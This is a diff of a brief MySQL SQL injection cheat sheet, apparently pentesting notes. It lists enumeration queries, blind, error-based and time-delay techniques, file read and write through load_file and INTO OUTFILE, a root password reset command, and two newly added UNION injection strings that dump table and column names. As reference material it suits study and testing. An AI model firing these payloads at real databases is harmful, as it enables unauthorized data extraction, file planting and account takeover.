@@ -1,44 +1,45 @@
 MySQL Payload
 =====================================
-
 - Version 
-    - ``SELECT @@version``
+    + ``SELECT @@version``
 - Comment 
-    - ``SELECT 1 -- comment``
-    - ``SELECT 1 # comment``
-    - ``SELECT /*comment*/1``
+    + ``SELECT 1 -- comment``
+    + ``SELECT 1 # comment``
+    + ``SELECT /*comment*/1``
 - Current User
-    - ``SELECT user()``
-    - ``SELECT system_user()``
+    + ``SELECT user()``
+    + ``SELECT system_user()``
 - List User
-    - ``SELECT user FROM mysql.user``
+    + ``SELECT user FROM mysql.user``
 - Current Database
-    - ``SELECT database()``
+    + ``SELECT database()``
 - List Database
-    - ``SELECT schema_name FROM information_schema.schemata``
+    + ``SELECT schema_name FROM information_schema.schemata``
 - List Tables
-    - ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
+	+ ``SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
+	+ ``1" union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#``
 - List Columns
-    - ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
+	+ ``SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'``
+	+ ``1" union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name='user'#``
 - If
-    - ``SELECT if(1=1,'foo','bar');`` return 'foo'
+    + ``SELECT if(1=1,'foo','bar');`` =>return ``'foo'``
 - Ascii
-    - ``SELECT char(0x41)``
-    - ``SELECT ascii('A')``
-    - ``SELECT 0x414243`` => return ``ABC``
+	+ ``SELECT char(0x41)``
+	+ ``SELECT ascii('A')``
+	+ ``SELECT 0x414243`` => return ``ABC``
 - Delay
-    - ``sleep(1)``
-    - ``SELECT BENCHMARK(1000000,MD5('A'))``
+    + ``sleep(1)``
+    + ``SELECT BENCHMARK(1000000,MD5('A'))``
 - Read File
-    - ``select @@datadir``
-    - ``select load_file('databasename/tablename.MYD')``
+    + ``select @@datadir``
+    + ``select load_file('databasename/tablename.MYD')``
 - Blind
-    - ``ascii(substring(str,pos,length)) & 32 = 1``
+    + ``ascii(substring(str,pos,length)) & 32 = 1``
 - Error Based
-    - ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
+    + ``select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;``
 - Write File
-    - ``union select 1,1,1 into outfile '/tmp/demo.txt'``
-    - ``union select 1,1,1 into dumpfile '/tmp/demo.txt'``
-    - dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
+    + ``union select 1,1,1 into outfile '/tmp/demo.txt'``
+    + ``union select 1,1,1 into dumpfile '/tmp/demo.txt'``
+    + dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
 - Change Password
-    - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
+    + ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
